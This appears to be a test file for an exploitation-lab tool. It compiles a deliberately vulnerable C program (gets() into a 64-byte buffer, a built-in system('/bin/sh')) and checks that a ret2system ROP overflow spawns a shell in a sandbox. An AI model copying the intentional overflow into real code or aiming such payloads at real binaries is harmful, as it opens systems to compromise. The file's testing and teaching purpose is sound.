"""PTY 셸 증명: ret2system 이 실제 셸을 띄우고 명령을 실행함을 확인."""

from __future__ import annotations

import platform
import shutil
import subprocess

import pytest

from pwnable_lab.analyzer.strategy import find_ret_gadget, ret2system_plan
from pwnable_lab.api.services import AnalysisService
from pwnable_lab.config import Settings
from pwnable_lab.elf.parser import parse_elf
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox import SandboxLimits, verify_shell

_SUPPORTED = platform.system() == "Linux" and platform.machine() in {"x86_64", "AMD64"}
_HAVE_GCC = shutil.which("gcc") is not None

_SYS_SRC = """
#include <stdio.h>
#include <stdlib.h>
__asm__(".global g_pop_rdi\\ng_pop_rdi: pop %rdi\\n ret\\n");
void never(void){ puts("x"); system("/bin/sh"); }
void vuln(void){ char buf[64]; gets(buf); }
int main(void){ vuln(); return 0; }
"""

_gated = pytest.mark.skipif(
    not (_SUPPORTED and _HAVE_GCC), reason="Linux/x86-64 + gcc 필요(실제 실행)"
)


def _compile(tmp_path):
    csrc = tmp_path / "sys.c"
    csrc.write_text(_SYS_SRC)
    out = tmp_path / "sys"
    subprocess.run(
        ["gcc", "-fno-stack-protector", "-no-pie", "-o", str(out), str(csrc)],
        check=True,
        capture_output=True,
    )
    return out


def test_task_count_estimate_is_positive_on_linux():
    from pwnable_lab.sandbox.runner import _estimate_task_count

    count = _estimate_task_count()
    if _SUPPORTED:
        # 셸 spawn 경로의 NPROC 상한 = 이 추정치 + headroom. 태스크(스레드 포함)를
        # 세므로 프로세스 수보다 크고, fork-bomb 을 유한 바운드하는 근거가 된다.
        assert count > 0


@_gated
def test_verify_shell_runs_a_command(tmp_path):
    out = _compile(tmp_path)
    img = parse_elf(out.read_bytes())
    plan = ret2system_plan(img)
    ret = find_ret_gadget(img)
    assert plan is not None and ret is not None

    payload = build_overflow(
        72,
        plan["pop_rdi"],
        bits=64,
        chain=[RopStep(plan["binsh"]), RopStep(ret), RopStep(plan["system"])],
    )
    proof = verify_shell(
        str(out), payload, marker="PWNPILOT_TESTMARK", limits=SandboxLimits()
    )
    assert proof.shell_spawned is True
    assert "PWNPILOT_TESTMARK" in proof.output.decode("utf-8", "replace")


@_gated
def test_auto_exploit_ret2system_is_shell_proven(tmp_path):
    out = _compile(tmp_path)
    service = AnalysisService(
        Settings(sandbox_execution_enabled=True, sandbox_executor="inprocess")
    )
    result = service.auto_exploit(out.read_bytes(), pattern_length=400)
    v = result["verification"]
    assert v["technique"] == "ret2system"
    assert v["succeeded"] is True
    # 휴리스틱을 넘어 실제 셸 명령 실행까지 증명됐다.
    assert v["shell_proven"] is True
    assert v["reason"] == "shell-proven"
    assert v["shell_proof"]["shell_spawned"] is True
